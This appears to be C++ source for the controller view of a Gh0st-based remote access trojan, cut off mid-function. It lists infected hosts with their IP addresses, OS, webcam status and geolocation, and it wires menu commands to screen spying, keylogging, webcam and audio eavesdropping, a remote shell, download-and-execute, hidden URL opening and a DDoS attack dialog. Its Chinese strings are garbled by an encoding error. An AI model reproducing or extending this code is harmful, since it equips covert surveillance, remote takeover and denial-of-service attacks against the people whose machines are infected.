// PcView.cpp : implementation file
//
#include "stdafx.h"
#include "DHL_yk.h"
#include "PcView.h"

#include "MainFrm.h"
#include "gh0stView.h"
#include "InputDlg.h"


#include "SerManager.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "ChangeGroup.h"
#include "LogView.h"
#include "ShowNum.h"
#include "RegDlg.h"
#include "User.h"
#include "MsgBox.h"

//DOSS
#include "DDOSAttackDlg.h"
//DOSS

//#include "ClienttProxy.h"
//#include "User.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CPcView*		g_pConnectView;

extern CGh0stView*	g_pTabView;
extern CMainFrame*	g_pFrame;
extern CLogView*	g_pLogView; 
extern CShowNum*	g_pNumDlg;

typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[20] = 
{
	{"����",			70	},  //56
	{"����IP",			103	},
	{"����IP",			103	},
	{"�������/��ע",	100	},
	{"����ϵͳ",		67	},
	{"CPU������",		72	},
	{"Ӳ��/�ڴ�����",	98  },
	{"��Ƶ",			42	},
	{"DDOS״̬",		60	},  //DOSS
	{"������ʱ",		65	},
	{"����汾",	    73	},
	{"����˰�װʱ��",	110	},
	{"��������ʱ��",	92	},
	{"����λ��",		175	}
};

int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);// - !((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist;
/////////////////////////////////////////////////////////////////////////////
// CPcView

IMPLEMENT_DYNCREATE(CPcView, CListView)

CPcView::CPcView()
{

	CHAR ModuletemDis[MAX_PATH]={0};
	sprintf(ModuletemDis,"%s\\Control\\QQwry.dat",((CGh0stApp *)AfxGetApp())->ModuletemDir);   //����Ŀ¼�ͳ�������

	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath(ModuletemDis);
	}
	((CGh0stApp *)AfxGetApp())->m_pConnectView = this;

}

CPcView::~CPcView()
{
}


BEGIN_MESSAGE_MAP(CPcView, CListView)
	//{{AFX_MSG_MAP(CPcView)
	ON_WM_SIZE()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_CHANGE_GROUP, OnChangeGroup)
	ON_COMMAND(IDM_IPLIST, OnIplist)
	ON_COMMAND(IDM_IP, OnIp)
	ON_COMMAND(IDM_BEIZHU, OnBeizhu)
	ON_COMMAND(IDM_DILIXINXI, OnDilixinxi)
	ON_COMMAND(IDM_ALL, OnAll)
	ON_COMMAND(IDM_SERMANAGER, OnSermanager)
	ON_COMMAND(IDM_REGEDIT, OnRegedit)    //ע���
	ON_COMMAND(IDM_START_HIDE, OnStartHide)  //��������
	ON_COMMAND(IDM_START_NORMAL, OnStartNormal)
    ON_COMMAND(IDM_UPDATA, OnUpdata)
	ON_COMMAND(IDM_NO_START, OnNoStart)
	ON_COMMAND(IDM_ADD_SERVER, OnAddUser)  //������
	ON_COMMAND(IDC_AQGL_RZ, OnAqglRz)
	ON_COMMAND(IDC_AQGL_YP,OnAqglYp)
	ON_COMMAND(IDM_SHOWMSG, OnShowmsg)
	ON_COMMAND(IDM_DDOS, OnDdos)
	//ON_WM_PAINT()
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENPSERLISTDIALOG, OnOpenSerManagerDialog)
//	ON_MESSAGE(WM_FINDALL, OnFindALL)
//	ON_MESSAGE(WM_FIND, OnFind)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)  //ע���
	ON_MESSAGE(WM_OPENRUSERGDIALOG, OnOpenUserDialog)  //������
	//DOSS
	///////////�������������е�/////////////////////	
	ON_MESSAGE(WM_FREE_YES, OnFindYes)
    ON_MESSAGE(WM_FREE_NO, OnFindNo)
	////////////////////////////////////////////
//DOSS
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcView drawing

void CPcView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CPcView diagnostics

#ifdef _DEBUG
void CPcView::AssertValid() const
{
	CListView::AssertValid();
}

void CPcView::Dump(CDumpContext& dc) const
{	
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	CListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPcView message handlers

BOOL CPcView::PreCreateWindow(CREATESTRUCT& cs) 
{
	// TODO: Add your specialized code here and/or call the base class
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

void CPcView::OnInitialUpdate() 
{
	CListView::OnInitialUpdate();
	
	m_pListCtrl = &GetListCtrl();

	//������չ��� ���������ߵ�
//	m_pListCtrl->SetExtendedStyle(/*LVIF_PARAM |*/ LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP|LVS_EX_FLATSB|
//         LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES|LVS_EX_CHECKBOXES);

	I_ImageList.Create(16, 16, ILC_COLOR32|ILC_MASK,10, 0);
	HICON hIcon = NULL;	// ����Ϊ����3��ͼ����Դ
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_SHIPIN), IMAGE_ICON, 32, 32, 0);
	I_ImageList.Add(hIcon);
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_USER), IMAGE_ICON, 32, 32, 0);
	I_ImageList.Add(hIcon);
	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL); 

//	m_pListCtrl->SetExtendedStyle(LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |
//		LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES );
	m_pListCtrl->SetExtendedStyle(LVIF_PARAM | LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP|
		LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES |LVS_EX_GRIDLINES );
	
	// �ı���������������ɫ
	
	//m_pListCtrl->SetTextColor(RGB(237,96,61)); // ��ɫ��ʾ
	//m_pListCtrl->SetTextColor(RGB(240,0,150)); //�ۺ���ʾ
	m_pListCtrl->SetTextColor(RGB(0,100,255)); // ��ɫ��ʾ
	
	m_pListCtrl->SetTextBkColor(-1); 
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // �ܿ��
	}
	
//	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
//	m_header.SubclassWindow(hWndHeader);

//	xtpThemeOffice2000,     // Office 2000 theme.
//	xtpThemeOfficeXP,       // Office XP theme.
//	xtpThemeOffice2003,     // Office 2003 theme.
//	xtpThemeNativeWinXP,    // Windows XP themes support.
//	xtpThemeWhidbey,        // Visual Studio 2005 theme.
//	xtpThemeOffice2007,     // Office 2007 theme.
//	xtpThemeRibbon,         // Office 2007 style ribbon theme
//	xtpThemeVisualStudio2008, // Visual Studio 2008 theme
//	xtpThemeCustom          // Custom theme.

//	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);		
//	EnableUserSortColor(false);
	/*
	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	*/
//	CXTPPaintManager::SetTheme(xtpThemeOffice2003);	
//	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
	//CXTPPaintManager::SetTheme(xtpThemeOfficeXP);
}

void CPcView::NewInitialUpdate()
{
	CListView::OnInitialUpdate();
	
	m_pListCtrl = &GetListCtrl();

	I_ImageList.Create(16, 16, ILC_COLOR32|ILC_MASK,10, 0);
	HICON hIcon = NULL;// ����Ϊ����3��ͼ����Դ
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_SHIPIN), IMAGE_ICON, 32, 32, 0);
	I_ImageList.Add(hIcon);
	hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_USER), IMAGE_ICON, 32, 32, 0);
	I_ImageList.Add(hIcon);
	ListView_SetImageList(m_pListCtrl->m_hWnd,I_ImageList, LVSIL_SMALL); 
	
	m_pListCtrl->SetExtendedStyle(LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT /*| LVS_EX_FLATSB*/ |
		LVS_EX_ONECLICKACTIVATE | LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES );
/*
		m_pListCtrl->SetExtendedStyle(
		LVS_EX_FULLROWSELECT
		//|LVS_EX_HEADERDRAGDROP//����ͷ������ק
		//|LVS_EX_ONECLICKACTIVATE//��������
		//|LVS_EX_GRIDLINES//���Ʊ��
		//|LVS_EX_FLATSB//��ƽ������
		//|LVS_EX_MULTIWORKAREAS
		//| LVIF_IMAGE 
		//| LVIF_PARAM //����ѡ��
		//| LVIF_TEXT
		//|LVIF_IMAGE 
		//| LVIF_TEXT
		//LVS_EX_CHECKBOXES //����ѡ��
		//LVS_EX_TWOCLICKACTIVATE//˫������
		|LVIS_STATEIMAGEMASK //���»���
		);
*/	
	// �ı���������������ɫ
	
	//m_pListCtrl->SetTextColor(RGB(237,96,61)); // ��ɫ��ʾ
	//m_pListCtrl->SetTextColor(RGB(240,0,150)); //�ۺ���ʾ
	m_pListCtrl->SetTextColor(RGB(0,100,255)); // ��ɫ��ʾ
	
//	m_pListCtrl->SetTextBkColor(-1); 
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // �ܿ��
	}
	
//	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
//	m_header.SubclassWindow(hWndHeader);

//	xtpThemeOffice2000,     // Office 2000 theme.
//	xtpThemeOfficeXP,       // Office XP theme.
//	xtpThemeOffice2003,     // Office 2003 theme.
//	xtpThemeNativeWinXP,    // Windows XP themes support.
//	xtpThemeWhidbey,        // Visual Studio 2005 theme.
//	xtpThemeOffice2007,     // Office 2007 theme.
//	xtpThemeRibbon,         // Office 2007 style ribbon theme
//	xtpThemeVisualStudio2008, // Visual Studio 2008 theme
//	xtpThemeCustom          // Custom theme.

//	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);	
//	EnableUserSortColor(false);
	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	//m_header.SubclassWindow(hWndHeader);
	//m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
//	CXTPPaintManager::SetTheme(xtpThemeOffice2003);	
//	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2008);
	//CXTPPaintManager::SetTheme(xtpThemeOfficeXP);
}

void CPcView::OnSize(UINT nType, int cx, int cy) 
{
	CListView::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (m_pListCtrl == NULL)
		return;
	
	CRect rcClient;
	GetClientRect(rcClient);
	
	int	nClientWidth = rcClient.Width();
	int nIndex = g_Column_Count - 1;
	
	if (nClientWidth < g_Column_Width)
		return;
	
	m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);

	Invalidate();		//ˢ��
}
/*
BOOL CPcView::DeleteIcon()
{
// ɾ���������е�ͼ��
NOTIFYICONDATA nid;
nid.cbSize = sizeof(nid);
nid.hWnd = m_hWnd;
nid.uID = IDR_MAINFRAME;

return Shell_NotifyIcon(NIM_DELETE, &nid);
}
*/


//DOSS
void CPcView::OnDdos()
{
	static CDDOSAttackDlg *m_Attack =NULL;
	if(m_Attack==NULL)
	{
		m_Attack= new CDDOSAttackDlg;
		m_Attack->Point=this;
		m_Attack->Create(IDD_ATTACK_DIALOG,GetDesktopWindow());
	}	
	m_Attack->ShowWindow(SW_SHOW);	
}
//DOSS



void CPcView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default



	CListView::OnRButtonDown(nFlags, point);
	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu*	pM = popup.GetSubMenu(0);

	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
//	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,p.x, p.y, AfxGetMainWnd(), 0, 0, 
//		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());


	if (m_pListCtrl->GetSelectedCount() == 0)
	{
		for (int i = 0; i < count - 2; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	}
	
	// ȫѡ
	if (m_pListCtrl->GetItemCount() > 0)
	{
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_ENABLED);
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	

	// ��ɾ��ͼ��
//    DeleteIcon();
	// ���������ڼ���
//    SetForegroundWindow();

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
//	pM->TrackPopupMenu(TPM_LEFTBUTTON|TPM_RIGHTBUTTON, p.x, p.y, this, NULL);

//	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,p.x, p.y, AfxGetMainWnd(), 0, 0, 
//		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());

//	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON, p.x, p.y, this);
//	CXTPCommandBars::TrackPopupMenu(pM, TPM_LEFTALIGN,p.x, p.y, AfxGetMainWnd(), 0, 0, 
//		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());
//	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,
//	p.x, p.y, AfxGetMainWnd(), 0, 0, ((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());
//	PostMessage(WM_USER, 0, 0);
}

BOOL IsFileExist(LPCTSTR strFileName)
{
	if(strFileName == NULL)
		return FALSE;
	
	DWORD dwAttr = ::GetFileAttributes(strFileName);
	return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}

//DOSS
/////////////////////////////��������������/////////////////////////

LRESULT CPcView::OnFindYes(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return 0;
    // ɾ����������п��ܻ�ɾ��Context
    try
    {
        int nCnt = m_pListCtrl->GetItemCount();
        for (int i = 0; i < nCnt; i++)
        {
            if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
            {
                m_pListCtrl->SetItemText(i, 13, _T("����"));
                break;
            }
        }
    }
    catch (...){}
    return 0;
}
LRESULT CPcView::OnFindNo(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return 0;
    // ɾ����������п��ܻ�ɾ��Context
    try
    {
        int nCnt = m_pListCtrl->GetItemCount();
        for (int i = 0; i < nCnt; i++)
        {
            if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
            {
                m_pListCtrl->SetItemText(i, 13, _T("æµ"));
                break;
            }
        }
    }
    catch (...){}
    return 0;
}
////////////////////////////////////////////
//DOSS
LRESULT CPcView::OnAddToList(WPARAM wParam, LPARAM lParam)
{	
	BOOL Cfsxts = NULL;
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	
	CString	strToolTipsText0, strToolTipsText1,strOS, strPwd;
	try
	{
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		CString	str;
		
		int nCnt = m_pListCtrl->GetItemCount();
		// int i = 0;
		// i = m_pListCtrl->InsertItem(nCnt, "", 0);
		
		// ��ͼ���IP��ַ
		int i = 0; 
/*		if (LoginInfo->bIsWebCam)
		{
			i = m_pListCtrl->InsertItem(nCnt, str, 0);
		}
		else
		{
			i = m_pListCtrl->InsertItem(nCnt, str, 1);
		}
*/
		// ����IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

//		i = m_pListCtrl->InsertItem(nCnt, str, 0);

		// ��������
        if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
        {
			i = m_pListCtrl->InsertItem(nCnt, str, 0);
            m_pListCtrl->SetItemText(i, 0, "����");
        }
        else
        {
			i = m_pListCtrl->InsertItem(nCnt, str, 1);
            m_pListCtrl->SetItemText(i, 0, "����"); //LoginInfo->sznet
        }


		//����λ��
		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
			str = m_QQwry->IPtoAdd(IPAddress);
		else
			str = "�Ҳ���IP���ݿ�";
		m_pListCtrl->SetItemText(i, 12, str);

		// ����IP
		m_pListCtrl->SetItemText(i, 1, IPAddress);
		
		// ����IP
		m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));

		// ������
		m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);
/*
		////////////////////////////////////////�ظ���������////////////////////////////////////////////////
		int Tmpi=0;
		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ ){
			if( m_pListCtrl->GetItemText( nCnt , 1 ) == m_pListCtrl->GetItemText( Tmpi , 1 )){//���ж�����IP
				if( m_pListCtrl->GetItemText( nCnt , 2 ) == m_pListCtrl->GetItemText( Tmpi , 2 )){//���ж�����IP

					m_pListCtrl->DeleteItem(Tmpi);
//	                g_pTabView->UpDateNumber();
//					g_pFrame->ShowConnectionsNumber();//����Ŀǰ��������
//					return 0;
				}
			}
		}
*/
		//////////////////////////////////////////////////////////////////////////////////////////////////////

		// ϵͳ
		////////////////////////////////////////////////////////////////////////////////////////
		// ��ʾ�����Ϣ
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			{
				pszOS = _T("NT");
				g_pNumDlg->NT++;
				g_pNumDlg->SetNum(IDC_WIN_NT, g_pNumDlg->NT);
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				pszOS = _T("2000");
				g_pNumDlg->Win2000++;
				g_pNumDlg->SetNum(IDC_WIN_2000, g_pNumDlg->Win2000);
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				pszOS = _T("XP");
				g_pNumDlg->XP++;
				g_pNumDlg->SetNum(IDC_WIN_XP, g_pNumDlg->XP);
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				pszOS = _T("2003");
				g_pNumDlg->Win2003++;
				g_pNumDlg->SetNum(IDC_WIN_2003, g_pNumDlg->Win2003);
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Vista");  // Just Joking
					g_pNumDlg->Vista++;
					g_pNumDlg->SetNum(IDC_WIN_VISTA, g_pNumDlg->Vista);
				}
				else
				{
					pszOS = _T("2008");
					g_pNumDlg->Win2008++;
					g_pNumDlg->SetNum(IDC_WIN_2008, g_pNumDlg->Win2008);
				}
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win7");
					g_pNumDlg->Win7++;
					g_pNumDlg->SetNum(IDC_WIN_7, g_pNumDlg->Win7);
				}
                else
				{
					pszOS = _T("2008R2");
					g_pNumDlg->Win2008++;
					g_pNumDlg->SetNum(IDC_WIN_2008, g_pNumDlg->Win2008);
				}
			}
		}
		strOS.Format( "%s SP%d", pszOS, LoginInfo->OsVerInfoEx.wServicePackMajor );
		m_pListCtrl->SetItemText(i, 4, strOS);
		
		// CPU
		str.Format("%s*%dMHz", LoginInfo->CPUNumber, LoginInfo->CPUClockMhz);
		m_pListCtrl->SetItemText(i, 5, str);

		// Ӳ�̡��ڴ��С
 		str.Format("%10.0fGB/%dMB",(float)(LoginInfo->DriverSize) / 1024,LoginInfo->MemSize);

		str.Replace(" ", "");
 		m_pListCtrl->SetItemText(i, 6, str);
	
		// ��Ƶ״̬
		str = LoginInfo->bIsWebCam ? " ��" : " --";
		m_pListCtrl->SetItemText(i, 7, str);

	
		// DDOS״̬
		str.Format("����");
		m_pListCtrl->SetItemText(i, 8, str);
		//DOSS

		// ������ʱ
		str.Format("%d/mS", LoginInfo->dwSpeed);
		m_pListCtrl->SetItemText(i, 9, str);

		//�汾
		str.Format("%s", LoginInfo->Version);
 		m_pListCtrl->SetItemText(i, 10, str);

		//����װʱ��
		str.Format("%s", LoginInfo->MarkTime);
 		m_pListCtrl->SetItemText(i, 11, str);

		//��������ʱ��
		str.Format("%s", LoginInfo->RunTime);
		m_pListCtrl->SetItemText(i, 12, str);

		//���߷���
		str = LoginInfo->UpGroup;
		m_pListCtrl->SetItemText(i, 14, str);


		// ָ��Ψһ��ʶ
		m_pListCtrl->SetItemData(i, (DWORD) pContext);

		strToolTipsText0.Format(_T("[%s/%s] -> ����:[%s] -> ����:[%s]"), 
			m_pListCtrl->GetItemText(i, 1),  //����IP
			m_pListCtrl->GetItemText(i, 2),  //����IP 
		    m_pListCtrl->GetItemText(i, 14), //���߷���
		    m_pListCtrl->GetItemText(i, 13));

		////////////////////////////////////////�ظ���������////////////////////////////////////////////////
		int Tmpi=0;
		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ ){
			if( m_pListCtrl->GetItemText( nCnt , 1 ) == m_pListCtrl->GetItemText( Tmpi , 1 )){//���ж�����IP
				if( m_pListCtrl->GetItemText( nCnt , 2 ) == m_pListCtrl->GetItemText( Tmpi , 2 )){//���ж�����IP
					Suanxinglianjxianshi(Tmpi);
					Cfsxts=TRUE;
				}
			}
		}

		CString LjieName;
		if(Cfsxts==NULL)  //����������
		{
			LjieName="��������:";
		}
		else
		{
			LjieName="�ظ�����:";
		}

		strToolTipsText1.Format(_T("%s%s"), 
			LjieName,                        //��������
		    strToolTipsText0);
//		g_pLogView->InsertLogItem( strToolTipsText1, 0, 0 );

		g_pTabView->UpDateNumber();
		g_pFrame->ShowConnectionsNumber();  //����Ŀǰ��������

		if(Cfsxts!=NULL)  //  �ظ����� �˳�
		{
			g_pLogView->InsertLogItem( strToolTipsText1, 0, 2 );
			return 0;
		}
		g_pLogView->InsertLogItem( strToolTipsText1, 0, 0 );

		//������ʾ
		strToolTipsText1.Format("I  P: %s\nϵͳ: Windows %s\n����: %s\n����: %s\nλ��: %s", 
			IPAddress, 
			strOS, 
			m_pListCtrl->GetItemText(i, 13),  //���߷���
			m_pListCtrl->GetItemText(i, 3),   //����
			m_pListCtrl->GetItemText(i, 12));

//        CIniFile m_IniFile;
//        BOOL a_chk = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "poptips", false);
//        if (a_chk == false)
//		{

//		}
//		if (!((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
//			g_pFrame->ShowToolTips(strToolTipsText1);

	}catch(...){}

	//����ͼ����˸��ʾ
    CIniFile m_IniFile;
    BOOL a_chk = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "poptips", false);
	g_pFrame->OnTimerspop(a_chk,strToolTipsText1); //����ͼ��״̬

	//************************************
	//����������ʾ
//    CIniFile m_IniFile;
    a_chk = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("����", "Alarm", false);
    if (a_chk != false)
    {
		PlaySound(MAKEINTRESOURCE(IDR_WAVE2),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
    }
	//************************************
	Invalidate();		//ˢ��

	return 0;
}

void CPcView::Suanxinglianjxianshi(UINT str)
{
	CString strLogText;
		
	strLogText = m_pListCtrl->GetItemText( str, 4 );
	strLogText.MakeUpper();
	if ( strLogText.Find("NT") != -1 )
	{
		g_pNumDlg->NT--;
		g_pNumDlg->SetNum( IDC_WIN_NT, g_pNumDlg->NT );
	}
	if ( strLogText.Find("XP") != -1 )
	{
		g_pNumDlg->XP--;
		g_pNumDlg->SetNum( IDC_WIN_XP, g_pNumDlg->XP );
	}
	if ( strLogText.Find("Vista") != -1 )
	{
		g_pNumDlg->Vista--;
		g_pNumDlg->SetNum( IDC_WIN_VISTA, g_pNumDlg->Vista );
	}
	if ( strLogText.Find("Win7") != -1 )
	{
		g_pNumDlg->Win7--;
		g_pNumDlg->SetNum( IDC_WIN_7, g_pNumDlg->Win7 );
	}
	if ( strLogText.Find("2000") != -1 )
	{
		g_pNumDlg->Win2000--;
		g_pNumDlg->SetNum( IDC_WIN_2000, g_pNumDlg->Win2000 );
	}
	if ( strLogText.Find("2003") != -1 )
	{
		g_pNumDlg->Win2003--;
		g_pNumDlg->SetNum( IDC_WIN_2003, g_pNumDlg->Win2003 );
	}
	if ( strLogText.Find("2008") != -1 )
	{
		g_pNumDlg->Win2008--;
		g_pNumDlg->SetNum( IDC_WIN_2008, g_pNumDlg->Win2008 );
	}
		
	m_pListCtrl->DeleteItem(str);	

	Invalidate();		//ˢ��
	
//	g_pTabView->UpDateNumber();
//	g_pFrame->ShowConnectionsNumber();
}

LRESULT CPcView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	CString strLogText;
	CPcView* pView = NULL;

	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->TCItem_GetHandle(n)));
		// ɾ����������п��ܻ�ɾ��Context
		try
		{
			int nCnt = pView->m_pListCtrl->GetItemCount();
			for (int i = 0; i < nCnt; i++)
			{
				if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
				{	
					strLogText.Format(("��������:[%s/%s] -> ����:[%s] -> ����:[%s]"), 
						pView->m_pListCtrl->GetItemText(i, 1),  //����IP
			            pView->m_pListCtrl->GetItemText(i, 2),  //����IP 
						pView->m_pListCtrl->GetItemText(i, 13),  //���߷���
						pView->m_pListCtrl->GetItemText(i, 12));
